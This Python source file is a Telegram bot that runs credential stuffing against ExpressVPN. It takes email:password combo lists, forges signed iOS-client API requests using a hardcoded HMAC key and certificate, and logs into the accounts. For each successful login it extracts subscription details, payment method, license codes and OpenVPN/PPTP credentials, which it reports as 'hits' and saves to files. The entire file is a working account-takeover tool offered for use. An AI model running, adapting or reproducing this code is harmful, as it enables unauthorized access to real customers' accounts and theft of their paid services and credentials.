import os
import json
import base64
import gzip
import hmac
import hashlib
import random
import string
import re
import time
import threading
from datetime import datetime
from typing import Dict, Any

import requests
import urllib3
import telebot
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
from cryptography.hazmat.primitives.padding import PKCS7
from cryptography import x509 as crypto_x509
from asn1crypto import cms, x509

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class AesCryptographyService:
    def decrypt(self, data: bytes, key: bytes, iv: bytes) -> bytes:
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
        decryptor = cipher.decryptor()
        decrypted = decryptor.update(data) + decryptor.finalize()
        unpadder = PKCS7(128).unpadder()
        return unpadder.update(decrypted) + unpadder.finalize()

    def encrypt(self, data: bytes, key: bytes, iv: bytes) -> bytes:
        padder = PKCS7(128).padder()
        padded = padder.update(data) + padder.finalize()
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
        encryptor = cipher.encryptor()
        return encryptor.update(padded) + encryptor.finalize()


class CryptoHelper:
    @staticmethod
    def get_byte_array(size: int) -> bytes:
        return os.urandom(size)

    @staticmethod
    def compute_signature(data: bytes, key: bytes) -> str:
        return base64.b64encode(hmac.new(key, data, hashlib.sha1).digest()).decode('ascii')

    @staticmethod
    def gzip_data(input_str: str) -> bytes:
        return gzip.compress(input_str.encode('ascii'), compresslevel=9)

    @staticmethod
    def envelope_encrypt(data: bytes, cert_base64: str) -> bytes:
        cert_der = base64.b64decode(cert_base64)
        cert = x509.Certificate.load(cert_der)
        aes_key = os.urandom(16)
        iv = os.urandom(16)
        aes_service = AesCryptographyService()
        encrypted_content = aes_service.encrypt(data, aes_key, iv)
        crypto_cert = crypto_x509.load_der_x509_certificate(cert_der)
        public_key = crypto_cert.public_key()
        encrypted_key = public_key.encrypt(aes_key, asym_padding.PKCS1v15())

        recipient_info = cms.RecipientInfo({
            'ktri': cms.KeyTransRecipientInfo({
                'version': cms.CMSVersion(0),
                'rid': cms.RecipientIdentifier({
                    'issuer_and_serial_number': cms.IssuerAndSerialNumber({
                        'issuer': cert['tbs_certificate']['issuer'],
                        'serial_number': cert['tbs_certificate']['serial_number']
                    })
                }),
                'key_encryption_algorithm': cms.KeyEncryptionAlgorithm({
                    'algorithm': '1.2.840.113549.1.1.1',
                    'parameters': None
                }),
                'encrypted_key': encrypted_key
            })
        })

        enveloped_data = cms.EnvelopedData({
            'version': cms.CMSVersion(0),
            'recipient_infos': cms.RecipientInfos([recipient_info]),
            'encrypted_content_info': cms.EncryptedContentInfo({
                'content_type': '1.2.840.113549.1.7.1',
                'content_encryption_algorithm': cms.EncryptionAlgorithm({
                    'algorithm': '2.16.840.1.101.3.4.1.2',
                    'parameters': iv
                }),
                'encrypted_content': encrypted_content
            })
        })

        content_info = cms.ContentInfo({
            'content_type': '1.2.840.113549.1.7.3',
            'content': enveloped_data
        })
        return content_info.dump()


class ExpressVPNChecker:
    def __init__(self):
        self.cert_base64 = "MIIDXTCCAkWgAwIBAgIJALPWYfHAoH+CMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwHhcNMTcxMTA5MDUwNTIzWhcNMjcxMTA3MDUwNTIzWjBFMQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UECgwYSW50ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtUCqVSHRqQ5XnrnA4KEnGSLGRSHWgyOgpNzNjEUmjlO25Ojncaw0u+hHAns8I3kNPk0qFlGP7oLeZvFH8+duDF02j4yVFDHkHRGyTBe3PsYvztDVzmddtG8eBgwJ88PocBXDjJvCojfkyQ8sY4EtK3y0UDJj4uJKckVdLUL8wFt2DPj+A3E4/KgYELNXA3oUlNjFwr4kqpxeDjvTi3W4T02bhRXYXgDMgQgtLZMpf1zOpM2lfqRq6sFoOmzlBTv2qbvmcOSEz3ZamwFxoYDB86EfnKPCq6ZareO/1MWGHwxH24SoJhFmyOsvq/kPPa03GJnKtMUznTnBVhwWy7KJIwIDAQABo1AwTjAdBgNVHQ4EFgQUoKnoagA0CLOLTzDb2lQ/v/osUz0wHwYDVR0jBBgwFoAUoKnoagA0CLOLTzDb2lQ/v/osUz0wDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAmF8BLuzF0rY2T2v2jTpCiqKxXARjalSjmDJLzDTWojrurHC5C/xVB8Hg+8USHPoM4V7Hr0zE4GYT5N5V+pJp/CUHppzzY9uYAJ1iXJpLXQyRD/SR4BaacMHUqakMjRbm3hwyi/pe4oQmyg66rZClV6eBxEnFKofArNtdCZWGliRAy9P8krF8poSElJtvlYQ70vWiZVIU7kV6adMVFtmPq4stjog7c2Pu0EEylRlclWlD0r8YSuvA8XoMboYyfp+RiyixhqL1o2C1JJTjY4S/t+UvQq5xTsWun+PrDoEtupjto/0sRGnD9GB5Pe0J2+VGbx3ITPStNzOuxZ4BXLe7YA=="
        self.hmac_key = "@~y{T4]wfJMA},qG}06rDO{f0<kYEwYWX'K)-GOyB^exg;K_k-J7j%$)L@[2me3~"
        self.crypto = AesCryptographyService()

    def check_account(self, email: str, password: str) -> Dict[str, Any]:
        result = {'email': email, 'password': password, 'status': 'FAIL', 'data': {}, 'error': None}
        try:
            iv = CryptoHelper.get_byte_array(16)
            key = CryptoHelper.get_byte_array(16)
            base64_iv = base64.b64encode(iv).decode('ascii')
            base64_key = base64.b64encode(key).decode('ascii')

            install_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=64))

            post_data = json.dumps({"email": email, "iv": base64_iv, "key": base64_key, "password": password})
            gzipped = CryptoHelper.gzip_data(post_data)
            encrypted_post = CryptoHelper.envelope_encrypt(gzipped, self.cert_base64)

            header_raw = f"POST /apis/v2/credentials?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
            header_signature = CryptoHelper.compute_signature(header_raw.encode('ascii'), self.hmac_key.encode('ascii'))
            post_signature = CryptoHelper.compute_signature(encrypted_post, self.hmac_key.encode('ascii'))

            session = requests.Session()
            session.headers.update({'User-Agent': 'xvclient/v21.21.0 (ios; 14.4) ui/11.5.2'})

            url = f"https://www.expressapisv2.net/apis/v2/credentials?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
            headers = {
                'Content-Type': 'application/octet-stream',
                'X-Body-Compression': 'gzip',
                'X-Signature': f'2 {header_signature} 91c776e',
                'X-Body-Signature': f'2 {post_signature} 91c776e',
                'Accept-Language': 'en',
            }

            response = session.post(url, data=encrypted_post, headers=headers, timeout=20, verify=False)

            if response.status_code in (401, 400):
                result['status'] = 'INVALID'
                return result
            elif response.status_code == 500:
                result['status'] = 'BAN'
                return result
            elif response.status_code != 200:
                result['status'] = 'ERROR'
                result['error'] = f'HTTP {response.status_code}'
                return result

            decrypted = self.crypto.decrypt(response.content, base64.b64decode(base64_key), base64.b64decode(base64_iv))
            response_body = decrypted.decode('utf-8', errors='ignore')

            access_token = re.search(r'"access_token":"([^"]+)"', response_body).group(1)
            ovpn_user = re.search(r'"ovpn_username":"([^"]+)"', response_body).group(1)
            ovpn_pass = re.search(r'"ovpn_password":"([^"]+)"', response_body).group(1)
            pptp_user = re.search(r'"pptp_username":"([^"]+)"', response_body).group(1)
            pptp_pass = re.search(r'"pptp_password":"([^"]+)"', response_body).group(1)

            sub_raw = f"GET /apis/v2/subscription?access_token={access_token}&client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4&reason=activation_with_email"
            sub_signature = CryptoHelper.compute_signature(sub_raw.encode('ascii'), self.hmac_key.encode('ascii'))

            batch_raw = f"POST /apis/v2/batch?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
            batch_signature = CryptoHelper.compute_signature(batch_raw.encode('ascii'), self.hmac_key.encode('ascii'))

            capture_body = f'[{{"headers":{{"Accept-Language":"en","X-Signature":"2 {sub_signature} 91c776e"}},"method":"GET","url":"/apis/v2/subscription?access_token={access_token}&client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4&reason=activation_with_email"}}]'
            capture_signature = CryptoHelper.compute_signature(capture_body.encode('ascii'), self.hmac_key.encode('ascii'))

            batch_url = f"https://www.expressapisv2.net/apis/v2/batch?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
            batch_headers = {
                'X-Body-Compression': 'gzip',
                'X-Signature': f'2 {batch_signature} 91c776e',
                'X-Body-Signature': f'2 {capture_signature} 91c776e',
                'Accept-Language': 'en',
            }

            batch_response = session.post(batch_url, data=capture_body, headers=batch_headers, timeout=20, verify=False)

            if 'subscription' not in batch_response.text or 'REVOKED' in batch_response.text or 'status\\\":\\\"\\\"' in batch_response.text:
                result['status'] = 'EXPIRED'
                return result

            unescaped = batch_response.text.encode().decode('unicode_escape')

            plan_match = re.search(r'billing_cycle":(\d+)', unescaped)
            plan = f"{plan_match.group(1)} Month" if plan_match else "Unknown"
            auto_renew_match = re.search(r'auto_bill":([^,]+)', unescaped)
            auto_renew = auto_renew_match.group(1) if auto_renew_match else "false"
            exp_match = re.search(r'expiration_time":(\d+)', unescaped)
            expiration = int(exp_match.group(1)) if exp_match else 0

            current_time = int(time.time())
            days_left = round((expiration - current_time) / 86400) if expiration > current_time else 0
            expire_date = datetime.fromtimestamp(expiration).strftime('%Y-%m-%d') if expiration else 'N/A'
            payment_match = re.search(r'payment_method":"([^"]+)"', unescaped)
            payment = payment_match.group(1) if payment_match else "Unknown"

            web_headers = {'authorization': f'Bearer {access_token}', 'User-Agent': 'Mozilla/5.0'}
            web_resp = session.get('https://www.expressvpn.com/api/v2/subscriptions', headers=web_headers, timeout=15, verify=False)
            licenses = re.findall(r'longCode":"([^"]+)"', web_resp.text)
            license_code = licenses[-1] if licenses else "N/A"

            session.close()

            result['status'] = 'HIT'
            result['data'] = {
                'plan': plan,
                'auto_renew': auto_renew == 'true',
                'expire_date': expire_date,
                'days_left': days_left,
                'payment_method': payment,
                'license': license_code,
                'ovpn_user': ovpn_user,
                'ovpn_pass': ovpn_pass,
                'pptp_user': pptp_user,
                'pptp_pass': pptp_pass
            }

        except Exception as e:
            result['status'] = 'ERROR'
            result['error'] = str(e)

        return result

    def save_result(self, result: Dict[str, Any], output_dir: str = "results"):
        os.makedirs(output_dir, exist_ok=True)
        timestamp = datetime.now().strftime('%Y-%m-%d')

        if result['status'] == 'HIT':
            with open(f"{output_dir}/hits_{timestamp}.txt", 'a', encoding='utf-8') as f:
                data = result['data']
                f.write(f"{result['email']}:{result['password']}\n")
                f.write(f"Plan: {data.get('plan')}\nExpires: {data.get('expire_date')} ({data.get('days_left')} days)\n")
                f.write(f"License: {data.get('license')}\nPayment: {data.get('payment_method')}\n")
                f.write(f"AutoRenew: {data.get('auto_renew')}\n")
                f.write(f"OVPN: {data.get('ovpn_user')}:{data.get('ovpn_pass')}\n")
                f.write(f"PPTP: {data.get('pptp_user')}:{data.get('pptp_pass')}\n\n")
        elif result['status'] == 'INVALID':
            with open(f"{output_dir}/invalid_{timestamp}.txt", 'a', encoding='utf-8') as f:
                f.write(f"{result['email']}:{result['password']}\n")
        elif result['status'] == 'EXPIRED':
            with open(f"{output_dir}/expired_{timestamp}.txt", 'a', encoding='utf-8') as f:
                f.write(f"{result['email']}:{result['password']}\n")
        elif result['status'] == 'ERROR':
            with open(f"{output_dir}/errors_{timestamp}.txt", 'a', encoding='utf-8') as f:
                f.write(f"{result['email']}:{result['password']} | {result.get('error', 'Unknown')}\n")


# ====================== PROFESSIONAL BOT ======================

BOT_TOKEN = os.getenv("BOT_TOKEN")

if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN environment variable is not set!")

bot = telebot.TeleBot(BOT_TOKEN)
checker = ExpressVPNChecker()
DELAY = 12

print("🤖 ExpressVPN Checker Bot Started on Render (Professional Mode)")

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message,
                 "✅ <b>ExpressVPN Checker</b>\n\n"
                 "Send your combos. Checking <b>one at a time</b> with delay for safety.",
                 parse_mode='HTML')

@bot.message_handler(func=lambda m: True)
def handle_message(message):
    text = message.text.strip()
    if not text:
        return

    lines = text.split('\n')
    combos = []
    for line in lines:
        line = line.strip()
        if ':' in line:
            try:
                email, password = line.split(':', 1)
                combos.append((email.strip(), password.strip()))
            except:
                pass

    if not combos:
        bot.reply_to(message, "❌ No valid combos found.")
        return

    bot.reply_to(message, f"🔍 Starting check for <b>{len(combos)}</b> accounts...", parse_mode='HTML')

    def process_all():
        for i, (email, password) in enumerate(combos, 1):
            bot.send_message(
                message.chat.id,
                f"⏳ Checking {i}/{len(combos)} → `{email}`",
                reply_to_message_id=message.message_id
            )

            result = checker.check_account(email, password)
            status = result['status']

            if status == 'HIT':
                d = result['data']
                reply = (
                    f"✅ <b>ExpressVPN Account Verified</b>\n\n"
                    f"<b>Email:</b> `{email}`\n\n"
                    f"<b>Plan:</b> {d.get('plan')}\n"
                    f"<b>Expires:</b> {d.get('expire_date')} ({d.get('days_left')} days)\n"
                    f"<b>License:</b> `{d.get('license')}`\n"
                    f"<b>Payment:</b> {d.get('payment_method')}\n"
                    f"<b>Auto Renew:</b> {'Yes ✅' if d.get('auto_renew') else 'No ❌'}\n\n"
                    f"<b>OVPN:</b> <code>{d.get('ovpn_user')}:{d.get('ovpn_pass')}</code>\n"
                    f"<b>PPTP:</b> <code>{d.get('pptp_user')}:{d.get('pptp_pass')}</code>"
                )
            elif status == 'INVALID':
                reply = f"❌ <b>Invalid Credentials</b>\n\n<b>Email:</b> `{email}`"
            elif status == 'EXPIRED':
                reply = f"⚠️ <b>Subscription Expired</b>\n\n<b>Email:</b> `{email}`"
            else:
                reply = f"❌ <b>Error</b>\n\n<b>Email:</b> `{email}`\nStatus: {status}"

            bot.send_message(message.chat.id, reply, reply_to_message_id=message.message_id, parse_mode='HTML')
            checker.save_result(result)

            if i < len(combos):
                time.sleep(DELAY)

    threading.Thread(target=process_all, daemon=True).start()


if __name__ == "__main__":
    print("🚀 Starting stable polling...")
    while True:
        try:
            bot.infinity_polling(none_stop=True, interval=0, timeout=30, long_polling_timeout=30)
        except Exception as e:
            print(f"⚠️ Polling error: {e}")
            print("🔄 Restarting in 5 seconds...")
            time.sleep(5)